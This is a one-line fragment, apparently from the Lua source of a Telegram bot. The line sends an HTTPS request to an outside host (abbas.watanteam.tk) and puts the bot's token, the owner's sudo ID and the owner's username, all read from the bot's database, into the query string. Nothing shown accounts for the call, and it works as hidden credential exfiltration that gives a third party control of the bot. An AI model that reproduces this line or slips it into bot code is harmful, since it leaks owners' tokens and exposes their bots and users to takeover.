...
https.request('https://abbas.watanteam.tk/WaTaN/WaTaN.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&username="..database:get(id_server..":SUDO:USERNAME"))
